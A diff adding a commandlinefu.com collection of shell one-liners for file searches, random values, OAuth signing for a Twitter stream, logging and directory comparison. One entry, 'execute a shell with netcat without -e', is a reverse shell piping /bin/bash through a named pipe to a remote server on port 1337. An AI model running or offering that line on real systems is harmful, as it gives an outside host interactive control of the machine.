@@ -1,0 +1,78 @@
+# commandlinefu.com - questions/comments: tech@commandlinefu.com
+
+# Recursively unrar into dir containing archive
+find . -name '*.rar' -execdir unrar e {} \;
+
+# True Random Dice Roll
+tr -cd '1-6' < /dev/urandom | head -c 1; echo
+
+# Find biggest 10 files in current and subdirectories and sort by file size
+find . -type f -print0 | xargs -0 du -h | sort -hr | head -10
+
+# Get your external IP and Network Info
+curl ifconfig.me/all
+
+# List all commands present on system
+ls ${PATH//:/ }
+
+# A line across the entire width of the terminal
+printf "%$(tput cols)s\n"|tr ' ' '='
+
+# Watch the progress of 'dd'
+pv -tpreb /dev/urandom | dd of=file.img
+
+# Recursively find top 20 largest files (> 1MB) sort human readable format
+find . -type f -print0 | xargs -0 du -h | sort -hr | head -20
+
+# Create the authorization header required for a Twitter stream feed
+step4() { oauth_header="Authorization: OAuth oauth_consumer_key=\"$k1\", oauth_nonce=\"$once\", oauth_signature=\"$signature\", oauth_signature_method=\"HMAC-SHA1\", oauth_timestamp=\"$ts\", oauth_token=\"$k3\", oauth_version=\"1.0\"" ; }
+
+# Create the signature base string required for a Twitter stream feed
+step2(){ b="GET&https%3A%2F%2Fstream.twitter.com%2F1%2Fstatuses%2Ffilter.json&follow%3D${id}%26oauth_consumer_key%3D${k1}%26oauth_nonce%3D${once}%26oauth_signature_method%3DHMAC-SHA1%26oauth_timestamp%3D${ts}%26oauth_token%3D${k3}%26oauth_version%3D1.0";}
+
+# Create the oauth token required for a Twitter stream feed
+step3() { s=$(echo -n $b | openssl dgst -sha1 -hmac $hmac -binary | openssl base64); signature=`for((i=0;i<${#s};i++)); do case ${s:i:1} in +) e %2B;; /) e %2F;; =) e %3D;; *) e ${s:i:1};; esac ; done` ; } ; e() { echo -n $1; }
+
+# Check if a machine is online
+ping -c 1 -q MACHINE_IP_OR_NAME >/dev/null 2>&1 && echo ONLINE || echo OFFLINE
+
+# extract element of xml
+xmlstarlet sel -t -c "/path/to/element" file.xml
+
+# Generate a random password 30 characters long
+cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 32
+
+# Remove the first and the latest caracter of a string
+var=:foobar:; echo ${var:1:-1}
+
+# Load file into RAM (cache) for faster accessing for repeated usage
+cat <file> > /dev/null
+
+# log a command to console and to 2 files separately stdout and stderr
+command > >(tee stdout.log) 2> >(tee stderr.log >&2)
+
+# Join lines split with backslash at the end
+sed -e '/\\$/{:0;N;s/\\\n//;t0}'
+
+# Convert text to lowercase
+lower() { echo ${@,,}; }
+
+# find builtin in bash v4+
+ls -l /etc/**/*killall
+
+# Compare directories via diff
+diff -rq dirA dirB
+
+# execute a shell with netcat without -e
+mknod backpipe p && nc remote_server 1337 0<backpipe | /bin/bash 1>backpipe
+
+# Save your terminal commands in bash history in real time
+shopt -s histappend ; PROMPT_COMMAND="history -a;$PROMPT_COMMAND"
+
+# Connect via SSH to VirtualBox guest VM without knowing IP address
+ssh vm-user@`VBoxManage guestproperty get "vm-name" "/VirtualBox/GuestInfo/Net/0/V4/IP" | awk '{ print $2 }'`
+
+# Make redirects to localhost via /etc/hosts more interesting
+sudo socat TCP4-LISTEN:80,bind=127.0.0.1,fork EXEC:'echo "HTTP/1.1 503 Service Unavailable";'
+
+# AD: Diff 2 entire servers at ScriptRock.com
